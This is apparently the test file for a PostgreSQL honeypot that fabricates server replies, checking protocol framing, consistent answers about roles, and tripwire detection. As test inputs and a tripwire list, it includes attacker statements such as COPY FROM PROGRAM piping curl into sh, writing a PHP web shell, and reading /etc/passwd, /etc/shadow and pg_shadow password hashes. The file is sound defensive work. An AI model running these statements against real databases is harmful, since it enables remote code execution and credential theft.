package postgres

import (
	"encoding/binary"
	"net/netip"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/config"
	wire "github.com/rom/xproxy/internal/pgwire"
)

// A database that is not there.
//
// What is worth asserting about a fabrication is not that it answers but that it
// answers what a real server answers, and that its answers agree with one
// another. A driver reads the shape -- the row description, the tag, the
// SQLSTATE -- and a visitor reads the content, so most of what follows takes the
// reply apart again rather than comparing octets.
//
// The agreement is the part that is easy to get wrong and is tested hardest: a
// role reported as not a superuser must be refused COPY FROM PROGRAM, and a
// server that said is_superuser off in its startup parameters must say f to
// usesuper. A fabrication whose answers disagree is one statement away from being
// found out.

func pgDecoy(t *testing.T, c *config.PostgresDeception) *decoy {
	t.Helper()
	d, err := newDecoy(c, "db")
	if err != nil {
		t.Fatalf("newDecoy: %v", err)
	}
	if d == nil {
		t.Fatal("newDecoy built nothing")
	}
	at := time.Date(2025, 3, 5, 14, 0, 0, 0, time.UTC)
	d.started = at.Add(-72 * time.Hour)
	d.values.SetClockForTest(func() time.Time { return at })
	return d
}

// pgMessage is one backend message: its type byte and its body.
type pgMessage struct {
	typ  byte
	body []byte
}

// messages reads a stream of backend messages, which is a second implementation
// of the framing rather than a reuse of the one under test.
//
// The length counts itself and excludes the type byte. A reader that had that
// wrong would find the next message at the wrong offset, so getting it right here
// is what makes every other assertion mean anything.
func messages(t *testing.T, raw []byte) []pgMessage {
	t.Helper()
	var out []pgMessage
	for len(raw) > 0 {
		if len(raw) < 5 {
			t.Fatalf("%d octets left, which is less than a header", len(raw))
		}
		n := int(binary.BigEndian.Uint32(raw[1:5]))
		if n < 4 {
			t.Fatalf("message %q declares a length of %d", raw[0], n)
		}
		if len(raw) < 1+n {
			t.Fatalf("message %q declares %d octets and %d are left", raw[0], n, len(raw)-1)
		}
		out = append(out, pgMessage{typ: raw[0], body: raw[5 : 1+n]})
		raw = raw[1+n:]
	}
	return out
}

// pgReply is a parsed answer to one statement.
type pgReply struct {
	severity string
	code     string
	text     string
	tag      string
	fields   []wire.Field
	rows     [][]*string
	empty    bool
	ready    byte
	types    []byte
}

func parseReply(t *testing.T, raw []byte) *pgReply {
	t.Helper()
	r := &pgReply{}
	for _, m := range messages(t, raw) {
		r.types = append(r.types, m.typ)
		switch m.typ {
		case wire.MsgErrorResponse, 'N':
			for _, f := range errorFields(t, m.body) {
				switch f[0] {
				case 'S':
					r.severity = f[1:]
				case 'C':
					r.code = f[1:]
				case 'M':
					r.text = f[1:]
				}
			}
		case wire.MsgCommandComplete:
			r.tag = cstr(t, m.body)
		case 'T':
			r.fields = rowDescription(t, m.body)
		case wire.MsgDataRow:
			r.rows = append(r.rows, dataRow(t, m.body, len(r.fields)))
		case 'I':
			r.empty = true
		case wire.MsgReadyForQuery:
			if len(m.body) != 1 {
				t.Fatalf("ReadyForQuery carries %d octets", len(m.body))
			}
			r.ready = m.body[0]
		}
	}
	return r
}

// errorFields returns each field of an ErrorResponse as its code followed by its
// value.
func errorFields(t *testing.T, body []byte) []string {
	t.Helper()
	var out []string
	for len(body) > 0 {
		if body[0] == 0 {
			return out
		}
		code := body[0]
		v := cstr(t, body[1:])
		out = append(out, string(code)+v)
		body = body[1+len(v)+1:]
	}
	t.Fatal("an error's fields are not terminated")
	return nil
}

func cstr(t *testing.T, b []byte) string {
	t.Helper()
	for i, c := range b {
		if c == 0 {
			return string(b[:i])
		}
	}
	t.Fatalf("a C string of %d octets has no terminator", len(b))
	return ""
}

func rowDescription(t *testing.T, body []byte) []wire.Field {
	t.Helper()
	if len(body) < 2 {
		t.Fatal("a row description with no count")
	}
	n := int(binary.BigEndian.Uint16(body[:2]))
	body = body[2:]
	out := make([]wire.Field, 0, n)
	for i := 0; i < n; i++ {
		name := cstr(t, body)
		body = body[len(name)+1:]
		if len(body) < 18 {
			t.Fatalf("column %d is %d octets short", i, 18-len(body))
		}
		out = append(out, wire.Field{
			Name:     name,
			OID:      binary.BigEndian.Uint32(body[6:10]),
			Size:     int16(binary.BigEndian.Uint16(body[10:12])), //nolint:gosec // -1 is 0xFFFF by design
			Modifier: int32(binary.BigEndian.Uint32(body[12:16])), //nolint:gosec // and likewise
		})
		if format := binary.BigEndian.Uint16(body[16:18]); format != 0 {
			t.Errorf("column %q declares format %d, and the simple query protocol is text", name, format)
		}
		body = body[18:]
	}
	if len(body) != 0 {
		t.Errorf("%d octets after the last column", len(body))
	}
	return out
}

func dataRow(t *testing.T, body []byte, cols int) []*string {
	t.Helper()
	if len(body) < 2 {
		t.Fatal("a data row with no count")
	}
	n := int(binary.BigEndian.Uint16(body[:2]))
	if cols > 0 && n != cols {
		t.Errorf("a row of %d values follows a description of %d columns", n, cols)
	}
	body = body[2:]
	out := make([]*string, 0, n)
	for i := 0; i < n; i++ {
		if len(body) < 4 {
			t.Fatalf("value %d has no length", i)
		}
		size := int32(binary.BigEndian.Uint32(body[:4])) //nolint:gosec // -1 is NULL
		body = body[4:]
		if size < 0 {
			// NULL, which is a length of -1 and not an empty string: a driver
			// tells them apart and an application acts on the difference.
			out = append(out, nil)
			continue
		}
		if len(body) < int(size) {
			t.Fatalf("value %d declares %d octets and %d are left", i, size, len(body))
		}
		out = append(out, wire.Str(string(body[:size])))
		body = body[size:]
	}
	return out
}

// askPG runs one statement against the fabrication and reads the reply back.
func askPG(t *testing.T, d *decoy, text string) *pgReply {
	t.Helper()
	return askAs(t, d, text, &decoySession{role: "app", database: "appdb"})
}

func askAs(t *testing.T, d *decoy, text string, se *decoySession) *pgReply {
	t.Helper()
	r := parseReply(t, d.query(text, se))
	// Every answer in the simple query protocol ends with one, and a client that
	// received an answer without it waits for ever. It is added in one place for
	// that reason, so it is asserted for every statement this file asks.
	if r.ready != 'I' {
		t.Fatalf("%q: the reply does not end with ReadyForQuery: %q", text, r.types)
	}
	return r
}

// onePG reads the single value of a one-column, one-row reply.
func onePG(t *testing.T, r *pgReply) string {
	t.Helper()
	if r.code != "" {
		t.Fatalf("an error reply: %s %s", r.code, r.text)
	}
	if len(r.rows) != 1 || len(r.rows[0]) != 1 {
		t.Fatalf("%d rows", len(r.rows))
	}
	if r.rows[0][0] == nil {
		t.Fatal("the value is NULL")
	}
	return *r.rows[0][0]
}

// The startup sequence, which is all of it or none: a client that received
// AuthenticationOk and no ReadyForQuery waits for ever.
func TestTheStartupSequenceIsOneAClientCanProceedFrom(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Version: "15.6 (Debian)"})
	msgs := messages(t, d.startup("app", 4242))
	if len(msgs) < 4 {
		t.Fatalf("%d messages", len(msgs))
	}
	if msgs[0].typ != wire.MsgAuthentication {
		t.Fatalf("the sequence opens with %q", msgs[0].typ)
	}
	if code := binary.BigEndian.Uint32(msgs[0].body); code != wire.AuthOK {
		t.Errorf("the authentication message carries code %d", code)
	}
	params := map[string]string{}
	var sawKey, sawReady bool
	for _, m := range msgs[1:] {
		switch m.typ {
		case wire.MsgParameterStatus:
			name := cstr(t, m.body)
			params[name] = cstr(t, m.body[len(name)+1:])
			if sawReady {
				t.Errorf("parameter %q arrives after ReadyForQuery", name)
			}
		case wire.MsgBackendKeyData:
			if len(m.body) != 8 {
				t.Errorf("BackendKeyData carries %d octets", len(m.body))
			}
			if pid := binary.BigEndian.Uint32(m.body[:4]); pid != 4242 {
				t.Errorf("BackendKeyData names process %d", pid)
			}
			sawKey = true
		case wire.MsgReadyForQuery:
			sawReady = true
		default:
			t.Errorf("an unexpected message %q in the startup sequence", m.typ)
		}
	}
	// A client that received no BackendKeyData cannot cancel a query afterwards,
	// and one that received no ReadyForQuery will not send a statement at all.
	if !sawKey {
		t.Error("the sequence has no BackendKeyData")
	}
	if !sawReady {
		t.Error("the sequence does not end with ReadyForQuery")
	}
	if msgs[len(msgs)-1].typ != wire.MsgReadyForQuery {
		t.Errorf("the sequence ends with %q", msgs[len(msgs)-1].typ)
	}
	// server_version is the first thing a scanner records and what a
	// vulnerability database is indexed by; client_encoding is one several
	// drivers will not proceed without.
	if params["server_version"] != "15.6 (Debian)" {
		t.Errorf("server_version %q", params["server_version"])
	}
	for _, name := range []string{
		"client_encoding", "server_encoding", "DateStyle", "integer_datetimes",
		"standard_conforming_strings", "TimeZone", "is_superuser",
		"session_authorization",
	} {
		if _, ok := params[name]; !ok {
			t.Errorf("the sequence announces no %s", name)
		}
	}
	if params["session_authorization"] != "app" {
		t.Errorf("session_authorization %q", params["session_authorization"])
	}
	// And everything it announced can be asked about again, with the same answer.
	// A client is told thirteen parameters before it sends a statement; one that
	// asked about one of those and was told "unrecognized configuration
	// parameter" would be talking to a server that forgot what it had just said,
	// which is a contradiction inside one connection.
	se := &decoySession{role: "app", database: "appdb"}
	for name, want := range params {
		r := askAs(t, d, "SHOW "+name, se)
		if r.code != "" {
			t.Errorf("SHOW %s answered %s %q, and the startup announced it", name, r.code, r.text)
			continue
		}
		if len(r.rows) != 1 || r.rows[0][0] == nil {
			t.Errorf("SHOW %s answered %d rows", name, len(r.rows))
			continue
		}
		if got := *r.rows[0][0]; got != want {
			t.Errorf("SHOW %s answered %q and the startup announced %q", name, got, want)
		}
	}
}

// The startup parameters and the catalogue must agree about the role, because a
// visitor asks both and the second answer is the one their next statement depends
// on.
func TestWhatTheStartupSaysAboutTheRoleIsWhatTheCatalogueSays(t *testing.T) {
	for _, super := range []bool{false, true} {
		name := "not a superuser"
		if super {
			name = "a superuser"
		}
		t.Run(name, func(t *testing.T) {
			d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Superuser: super})
			var announced string
			for _, m := range messages(t, d.startup("app", 1)) {
				if m.typ != wire.MsgParameterStatus {
					continue
				}
				if k := cstr(t, m.body); k == "is_superuser" {
					announced = cstr(t, m.body[len(k)+1:])
				}
			}
			if want := onOff(super); announced != want {
				t.Fatalf("the startup announced is_superuser %q, want %q", announced, want)
			}
			// The statement a scanner actually sends names both the role and the
			// superuser column, and it is the superuser question it is asking.
			r := askPG(t, d, "SELECT usesuper FROM pg_user WHERE usename = current_user")
			if len(r.fields) != 1 || r.fields[0].Name != "usesuper" {
				t.Fatalf("the reply describes %v, and the question was about the privilege", r.fields)
			}
			if got, want := onePG(t, r), boolText(super); got != want {
				t.Errorf("usesuper %q, want %q", got, want)
			}
			// The catalogue column has the same answer in the same form.
			if got := onePG(t, askPG(t, d, "SELECT rolsuper FROM pg_roles WHERE rolname = current_user")); got != boolText(super) {
				t.Errorf("rolsuper answered %q, want %q", got, boolText(super))
			}
			// And the setting has the same answer in the *setting's* form: a real
			// server says on or off to SHOW is_superuser and t or f to usesuper,
			// so a fabrication that answered one in the other's form disagrees
			// with itself in the way a fingerprinting tool checks for.
			for _, q := range []string{
				"SHOW is_superuser",
				"SELECT current_setting('is_superuser')",
			} {
				if got := onePG(t, askPG(t, d, q)); got != onOff(super) {
					t.Errorf("%q answered %q, want %q", q, got, onOff(super))
				}
			}
			// The privilege decides what COPY answers, and the two must agree:
			// a role reported as not a superuser that is nonetheless allowed to
			// COPY FROM PROGRAM is a contradiction in one statement.
			prog := askPG(t, d, "COPY t FROM PROGRAM 'id > /tmp/x'")
			if super {
				if prog.code != "XX000" {
					t.Errorf("a superuser's COPY FROM PROGRAM answered %s %q", prog.code, prog.text)
				}
			} else if prog.code != "42501" {
				t.Errorf("a plain role's COPY FROM PROGRAM answered %s %q", prog.code, prog.text)
			}
			if strings.Contains(strings.ToLower(prog.text), "ok") {
				t.Errorf("COPY FROM PROGRAM answered %q, which reads like a success", prog.text)
			}
		})
	}
}

// The reconnaissance: the statements whose answers decide what a visitor sends
// next.
func TestTheReconnaissanceStatementsAreAnswered(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{
		Mode: "decoy", Profile: "django", Databases: []string{"django", "postgres"},
		Tables: []string{"public.auth_user", "public.django_session"},
	})
	se := &decoySession{role: "django", database: "django"}

	version := onePG(t, askAs(t, d, "SELECT version()", se))
	if !strings.HasPrefix(version, "PostgreSQL 14.11") {
		t.Errorf("version() answered %q", version)
	}
	// The profile's version, not the newest release: a decoy claiming last
	// week's is one nobody believes on an estate that patches quarterly.
	if !strings.Contains(version, "x86_64-pc-linux-gnu") {
		t.Errorf("version() answered %q, which no real server's does", version)
	}

	if got := onePG(t, askAs(t, d, "SELECT current_database()", se)); got != "django" {
		t.Errorf("current_database answered %q", got)
	}
	if got := onePG(t, askAs(t, d, "SELECT current_user", se)); got != "django" {
		t.Errorf("current_user answered %q", got)
	}
	if got := onePG(t, askAs(t, d, "SELECT current_schema()", se)); got != "public" {
		t.Errorf("current_schema answered %q", got)
	}

	// The database list, which is what \l answers and the first question after
	// the version. Sorted, because a second read that came back in another order
	// would be a server reconfigured between two statements.
	dbs := askAs(t, d, "SELECT datname FROM pg_database", se)
	names := make([]string, 0, len(dbs.rows))
	for _, row := range dbs.rows {
		names = append(names, *row[0])
	}
	if strings.Join(names, ",") != "django,postgres" {
		t.Errorf("the database list is %v", names)
	}
	if dbs.fields[0].Name != "datname" {
		t.Errorf("the database list describes its first column as %q", dbs.fields[0].Name)
	}
	if dbs.tag != "SELECT 2" {
		t.Errorf("the database list is tagged %q, and a driver reads the count out of it", dbs.tag)
	}

	// The table list, the part of the fabrication a visitor reads most closely.
	tables := askAs(t, d, "SELECT schemaname, tablename FROM pg_tables", se)
	if len(tables.rows) != 2 {
		t.Fatalf("%d tables", len(tables.rows))
	}
	if *tables.rows[0][0] != "public" || *tables.rows[0][1] != "auth_user" {
		t.Errorf("the first table is %q.%q", *tables.rows[0][0], *tables.rows[0][1])
	}

	// The settings a scanner reads next: where the files are, and whether TLS is
	// on. They are a default package install's, because that is the server being
	// impersonated.
	// With and without the terminator a client library leaves on, because psql
	// sends one and a driver does not.
	for _, q := range []string{"SHOW data_directory", "SHOW data_directory;", "show DATA_DIRECTORY ;"} {
		if got := onePG(t, askAs(t, d, q, se)); !strings.HasPrefix(got, "/var/lib/postgresql") {
			t.Errorf("%q answered %q", q, got)
		}
	}
	if got := onePG(t, askAs(t, d, "SELECT current_setting('hba_file')", se)); !strings.HasSuffix(got, "pg_hba.conf") {
		t.Errorf("hba_file answered %q", got)
	}
	// A setting's name is case insensitive on this protocol, and two of the ones
	// a fabrication announces are spelled with capitals: a lookup that compared
	// exactly would answer "unrecognized configuration parameter" to a client
	// asking for the one it was just told about.
	for _, q := range []string{"SHOW timezone", "SHOW TimeZone", "SHOW intervalstyle"} {
		if r := askAs(t, d, q, se); r.code != "" {
			t.Errorf("%q answered %s %q", q, r.code, r.text)
		}
	}
	all := askAs(t, d, "SHOW ALL", se)
	if len(all.rows) < 10 || len(all.fields) != 3 {
		t.Errorf("SHOW ALL answered %d rows in %d columns", len(all.rows), len(all.fields))
	}

	// pg_stat_activity with one connection on it is a server nobody uses, which
	// is a tell.
	act := askAs(t, d, "SELECT pid, datname, usename FROM pg_stat_activity", se)
	if len(act.rows) < 2 {
		t.Errorf("pg_stat_activity answered %d rows", len(act.rows))
	}
	for _, row := range act.rows {
		if *row[1] != "django" {
			t.Errorf("a backend is on database %q", *row[1])
		}
	}
	// The last column is the running statement, and an idle backend's is NULL
	// rather than empty: a driver tells them apart.
	if last := act.rows[0][len(act.rows[0])-1]; last != nil {
		t.Errorf("an idle backend's query is %q rather than NULL", *last)
	}

	if got := onePG(t, askAs(t, d, "SELECT inet_server_port()", se)); got != "5432" {
		t.Errorf("inet_server_port answered %q", got)
	}
	if got := onePG(t, askAs(t, d, "SELECT pg_backend_pid()", se)); got == "0" {
		t.Errorf("pg_backend_pid answered %q", got)
	}
	start := onePG(t, askAs(t, d, "SELECT pg_postmaster_start_time()", se))
	if !strings.HasPrefix(start, "2025-03-02 14:00:00") {
		t.Errorf("pg_postmaster_start_time answered %q", start)
	}
	if got := onePG(t, askAs(t, d, "SELECT 1", se)); got != "1" {
		t.Errorf("SELECT 1 answered %q", got)
	}
}

// An unrecognised parameter is an error rather than an invented value, because a
// server that had every setting a visitor could name is not a server.
func TestAnUnknownSettingIsRefusedRatherThanInvented(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"})
	for _, q := range []string{
		"SHOW no_such_setting",
		"SELECT current_setting('no_such_setting')",
	} {
		r := askPG(t, d, q)
		if r.code != "42704" {
			t.Errorf("%q answered %s %q, want 42704", q, r.code, r.text)
		}
	}
	// The name without its call is a column reference, not a setting: a reader
	// that sliced from the missing bracket would parse a name out of the middle
	// of the statement.
	r := askPG(t, d, "SELECT current_setting")
	if r.code != "42703" {
		t.Errorf("a bare current_setting answered %s %q, want 42703", r.code, r.text)
	}
}

// The three forms of COPY, which are the worst statements on this protocol.
func TestCopyIsRefusedInEveryFormAndNeverRun(t *testing.T) {
	plain := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"})
	super := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Superuser: true})

	// Remote code execution, by design and documented. Neither answer is a
	// success, and the fabrication runs nothing either way.
	if r := askPG(t, plain, "COPY x FROM PROGRAM 'curl http://a/b|sh'"); r.code != "42501" ||
		!strings.Contains(r.text, "pg_execute_server_program") {
		t.Errorf("a plain role's COPY FROM PROGRAM answered %s %q", r.code, r.text)
	}
	if r := askPG(t, super, "COPY x FROM PROGRAM 'curl http://a/b|sh'"); r.code != "XX000" ||
		!strings.Contains(r.text, "failed") {
		t.Errorf("a superuser's COPY FROM PROGRAM answered %s %q", r.code, r.text)
	}

	// A server-side path, which is how a web shell gets written.
	if r := askPG(t, plain, "COPY t TO '/var/www/html/s.php'"); r.code != "42501" ||
		!strings.Contains(r.text, "pg_write_server_files") {
		t.Errorf("a plain role's COPY to a file answered %s %q", r.code, r.text)
	}
	if r := askPG(t, super, "COPY t TO '/var/www/html/s.php'"); r.code != "42501" {
		t.Errorf("a superuser's COPY to a file answered %s %q", r.code, r.text)
	}

	// STDIN would put the connection into copy mode, and the fabrication would
	// then have to read an unbounded stream. It is refused as a table nobody
	// has, which is also true, and the relation is quoted back the way a real
	// server quotes it.
	in := askPG(t, plain, "COPY secrets FROM STDIN")
	if in.code != "42P01" || !strings.Contains(in.text, `"secrets"`) {
		t.Errorf("COPY FROM STDIN answered %s %q", in.code, in.text)
	}
	out := askPG(t, super, "COPY users TO STDOUT")
	if out.code != "42P01" || !strings.Contains(out.text, `"users"`) {
		t.Errorf("COPY TO STDOUT answered %s %q", out.code, out.text)
	}
	// A parenthesised query names no relation, so quoting one back would have
	// quoted the word "select".
	q := askPG(t, super, "COPY (SELECT * FROM users) TO STDOUT")
	if q.code != "0A000" {
		t.Errorf("COPY of a query answered %s %q", q.code, q.text)
	}
	if strings.Contains(q.text, "select") {
		t.Errorf("COPY of a query answered %q, which quotes the statement back as a relation", q.text)
	}
	// No form of it ever answers with copy mode, because a CopyInResponse would
	// commit this fabrication to reading a stream.
	for _, text := range []string{
		"COPY x FROM PROGRAM 'sh'", "COPY t TO '/tmp/x'", "COPY t FROM STDIN",
		"COPY t TO STDOUT", "COPY (SELECT 1) TO STDOUT",
	} {
		for _, m := range messages(t, plain.query(text, &decoySession{role: "app"})) {
			switch m.typ {
			case wire.MsgCopyInResponse, wire.MsgCopyOutResponse, wire.MsgCopyBothRespons:
				t.Errorf("%q answered with copy mode (%q)", text, m.typ)
			}
		}
	}
}

// The file functions, which are the other way to read a file and the other way to
// write one.
func TestTheFileFunctionsAreRefusedInBothRoles(t *testing.T) {
	plain := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"})
	super := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Superuser: true})
	for _, q := range []string{
		"SELECT pg_read_file('/etc/passwd')",
		"SELECT pg_read_binary_file('/etc/shadow')",
		"SELECT pg_ls_dir('/var/lib/postgresql')",
		"SELECT pg_stat_file('/etc/passwd')",
		"SELECT lo_import('/etc/passwd')",
		"SELECT lo_export(1, '/var/www/s.php')",
	} {
		r := askPG(t, plain, q)
		if r.code != "42501" {
			t.Errorf("%q answered %s %q for a plain role, want 42501", q, r.code, r.text)
		}
		if len(r.rows) != 0 {
			t.Errorf("%q answered %d rows", q, len(r.rows))
		}
		// A superuser is refused too, with the wording a hardened server gives:
		// still an answer the visitor learns from, and still not a file.
		s := askPG(t, super, q)
		if s.code == "" || len(s.rows) != 0 {
			t.Errorf("%q answered %d rows and %s for a superuser", q, len(s.rows), s.code)
		}
		if strings.Contains(s.text, "root:") {
			t.Errorf("%q answered %q", q, s.text)
		}
	}
}

// pg_sleep is answered rather than honoured: waiting would make this listener's
// resources something a visitor can hold, a statement at a time, for as long as
// they like.
func TestSleepIsAnsweredRatherThanHonoured(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"})
	start := time.Now()
	r := askPG(t, d, "SELECT pg_sleep(600)")
	if took := time.Since(start); took > 2*time.Second {
		t.Fatalf("pg_sleep(600) took %v", took)
	}
	if r.code != "" {
		t.Fatalf("pg_sleep answered %s %q", r.code, r.text)
	}
	// void, which is what a real pg_sleep returns: one row, one empty value.
	if len(r.fields) != 1 || r.fields[0].Name != "pg_sleep" {
		t.Errorf("pg_sleep answered %v", r.fields)
	}
	if len(r.rows) != 1 || r.rows[0][0] == nil || *r.rows[0][0] != "" {
		t.Errorf("pg_sleep answered %d rows", len(r.rows))
	}
	// It is also one of the tripwires, because nothing legitimate asks a
	// fabricated database to wait.
	if !d.tripped("SELECT pg_sleep(600)") {
		t.Error("pg_sleep did not trip")
	}
}

// The catalogue tables that hold authentication material. An empty set would say
// the table is there and has no rows, which pg_shadow never is.
func TestThePrivilegedCataloguesAreRefusedRatherThanAnsweredEmpty(t *testing.T) {
	for _, super := range []bool{false, true} {
		d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Superuser: super})
		for _, q := range []string{
			"SELECT usename, passwd FROM pg_shadow",
			"SELECT rolname, rolpassword FROM pg_authid",
			"SELECT * FROM pg_catalog.pg_authid",
			"SELECT umuser, umoptions FROM pg_user_mappings",
			"SELECT loid, data FROM pg_largeobject",
		} {
			r := askPG(t, d, q)
			if r.code != "42501" {
				t.Errorf("superuser=%v: %q answered %s %q, want 42501", super, q, r.code, r.text)
			}
			if len(r.rows) != 0 || len(r.fields) != 0 {
				t.Errorf("superuser=%v: %q answered %d rows", super, q, len(r.rows))
			}
			if !d.tripped(q) {
				t.Errorf("%q did not trip", q)
			}
		}
	}
}

// A statement the recognisers do not know. An empty result set is the honest
// answer: the fabrication is a surface rather than a database, and inventing rows
// for an arbitrary projection would mean inventing a schema to match.
func TestAnUnrecognisedStatementGetsTheShapeItsKindImplies(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"})
	for _, c := range []struct{ text, tag string }{
		{"SELECT name, price FROM products WHERE id = 7", "SELECT 0"},
		{"BEGIN", "BEGIN"},
		{"COMMIT", "COMMIT"},
		{"ROLLBACK", "ROLLBACK"},
		{"SET statement_timeout = 0", "SET"},
		{"INSERT INTO t (a) VALUES (1)", "INSERT 0 1"},
		{"UPDATE t SET a = 1", "UPDATE 1"},
		{"DELETE FROM t WHERE a = 1", "DELETE 1"},
		{"CREATE TABLE t (a int)", "CREATE TABLE"},
		{"DROP TABLE t", "DROP TABLE"},
	} {
		r := askPG(t, d, c.text)
		if r.code != "" {
			t.Errorf("%q answered %s %q", c.text, r.code, r.text)
			continue
		}
		if r.tag != c.tag {
			t.Errorf("%q is tagged %q, want %q", c.text, r.tag, c.tag)
		}
		if len(r.rows) != 0 {
			t.Errorf("%q answered %d invented rows", c.text, len(r.rows))
		}
	}
	// A DO block is plpgsql, which this fabrication does not run and does not
	// claim to.
	if r := askPG(t, d, "DO $$ BEGIN PERFORM 1; END $$"); r.code != "42704" {
		t.Errorf("a DO block answered %s %q", r.code, r.text)
	}
	// An empty statement is not an error, and the protocol allows a client to
	// send one. A bare semicolon is the same statement written differently, and
	// answering it as SELECT 1 -- which is what a recogniser reaching for the
	// commonest statement on the protocol would do -- is a row a client did not
	// ask for.
	for _, text := range []string{"", ";", "   ", " ; "} {
		if e := askPG(t, d, text); !e.empty || len(e.rows) != 0 {
			t.Errorf("%q answered %q with %d rows", text, e.types, len(e.rows))
		}
	}
	// Text that does not lex is a syntax error rather than a guess.
	if r := askPG(t, d, "SELECT 'unterminated"); r.code != "42601" {
		t.Errorf("unlexable text answered %s %q", r.code, r.text)
	}
}

// The tripwires, which need no configuring here: nothing legitimate sends the
// escalation chain to a fabricated database.
func TestTheTripwiresNeedNoConfiguringAndOrdinaryTrafficDoesNotTripThem(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"})
	for _, text := range []string{
		"SELECT * FROM pg_shadow",
		"SELECT rolpassword FROM pg_authid",
		"SELECT pg_read_file('/etc/passwd')",
		"SELECT pg_ls_dir('/')",
		"SELECT lo_import('/etc/shadow')",
		"COPY t FROM PROGRAM 'sh -c id'",
		// A server-side path names no privileged identifier: the path is a
		// string literal, so this one is recognised by its shape or not at all.
		"COPY t TO '/var/www/html/s.php'",
		"COPY t FROM '/etc/passwd'",
		"SELECT pg_sleep(5)",
		"SELECT dblink_connect('host=10.0.0.1')",
		"GRANT pg_write_server_files TO app",
	} {
		if !d.tripped(text) {
			t.Errorf("%q did not trip", text)
		}
	}
	// And the traffic an application sends, which must not. A column named
	// "programs" is not COPY FROM PROGRAM and one named "sleepy" is not pg_sleep,
	// which is why a tripwire is matched as a whole identifier.
	for _, text := range []string{
		"SELECT id, email FROM users WHERE id = $1",
		"SELECT count(*) FROM programs",
		"UPDATE jobs SET sleepy = false",
		"INSERT INTO audit_log (actor) VALUES ('app')",
		"SELECT version()",
		"SELECT datname FROM pg_database",
		"SHOW data_directory",
		// Bulk ingest over the protocol reaches no file and no program, so it is
		// refused (there is no such table) without being an escalation.
		"COPY t FROM STDIN",
		"COPY t TO STDOUT",
		"COPY (SELECT 1) TO STDOUT",
	} {
		if d.tripped(text) {
			t.Errorf("%q tripped", text)
		}
	}
	// A configured name is in addition to the built-in set rather than instead
	// of it.
	extra := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Tripwire: []string{"Billing_Secrets"}})
	if !extra.tripped("select * from billing_secrets") {
		t.Error("a configured tripwire did not trip")
	}
	if !extra.tripped("SELECT pg_read_file('/etc/passwd')") {
		t.Error("configuring a tripwire replaced the built-in set")
	}
	if extra.tripped("select * from billing") {
		t.Error("a configured tripwire matched a prefix of itself")
	}
}

// Which clients get the fabrication, and what a section refuses to compile.
func TestTheSectionDecidesWhoIsAnsweredAndRefusesWhatItCannotMean(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{Clients: []string{"10.0.0.0/24"}})
	if !d.admits(netip.MustParseAddr("10.0.0.7")) {
		t.Error("a client in the list is not admitted")
	}
	if d.admits(netip.MustParseAddr("10.0.1.7")) {
		t.Error("a client outside the list is admitted")
	}
	// A decoy listener with no list answers everybody, which is what a honeypot
	// wants; the validator is what requires a list in mode answer.
	open := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"})
	if !open.admits(netip.MustParseAddr("203.0.113.9")) {
		t.Error("a decoy with no client list refused a client")
	}
	if !open.policy.Anyone() {
		t.Error("a decoy with no client list does not report that it answers anyone")
	}

	off := false
	if d, err := newDecoy(&config.PostgresDeception{Enabled: &off}, "db"); err != nil || d != nil {
		t.Errorf("a disabled section built %v, %v", d, err)
	}
	if d, err := newDecoy(nil, "db"); err != nil || d != nil {
		t.Errorf("an absent section built %v, %v", d, err)
	}
	for _, c := range []struct {
		why string
		c   config.PostgresDeception
	}{
		{"a profile nobody has", config.PostgresDeception{Profile: "oracle"}},
		{"a tripwire with a space in it", config.PostgresDeception{Tripwire: []string{"pg_read file"}}},
		{"an empty tripwire", config.PostgresDeception{Tripwire: []string{" "}}},
		{"a client that is not a prefix", config.PostgresDeception{Clients: []string{"10.0.0.1"}}},
	} {
		if _, err := newDecoy(&c.c, "db"); err == nil {
			t.Errorf("%s compiled", c.why)
		}
	}
	// A named profile is reported as itself, and an unnamed one as the default,
	// because the status view names what is being impersonated.
	if got := pgDecoy(t, &config.PostgresDeception{Mode: "decoy"}).profile; got != DefaultProfile {
		t.Errorf("an unnamed profile reports %q", got)
	}
	if got := pgDecoy(t, &config.PostgresDeception{Mode: "decoy", Profile: "rails"}).profile; got != "rails" {
		t.Errorf("the rails profile reports %q", got)
	}
	for _, name := range Profiles() {
		if _, ok := pgProfiles[name]; !ok {
			t.Errorf("Profiles names %q, which is not one", name)
		}
	}
	if len(Profiles()) != len(pgProfiles) {
		t.Errorf("Profiles names %d of %d", len(Profiles()), len(pgProfiles))
	}
	// The validator checks a profile name against its own list, so a name in one
	// list and not the other is a configuration that loads and then fails to
	// start -- or one the validator refuses although the listener would have
	// built it.
	if got, want := strings.Join(Profiles(), ","), strings.Join(config.PostgresDecoyProfiles, ","); got != want {
		t.Errorf("the listener has %q and the validator checks %q", got, want)
	}
}

// The lists are sorted and deduplicated, because a catalogue read twice that came
// back differently would be a server reconfigured between two statements.
func TestTheFabricatedCatalogueIsStableAcrossReads(t *testing.T) {
	d := pgDecoy(t, &config.PostgresDeception{
		Mode:      "decoy",
		Databases: []string{"zeta", "alpha", "zeta"},
		Tables:    []string{"public.b", "public.a", "public.b"},
	})
	if strings.Join(d.databases, ",") != "alpha,zeta" {
		t.Errorf("the databases are %v", d.databases)
	}
	if strings.Join(d.tables, ",") != "public.a,public.b" {
		t.Errorf("the tables are %v", d.tables)
	}
	se := &decoySession{role: "app"}
	first := d.query("SELECT datname FROM pg_database", se)
	second := d.query("SELECT datname FROM pg_database", se)
	if string(first) != string(second) {
		t.Error("two reads of the database list differ")
	}
	// The database a visitor is told they are on is the application's, not a
	// template and not the bootstrap one. The list is sorted, so the names are
	// chosen to put the application's last: a fabrication that simply took the
	// first would pass with any other three.
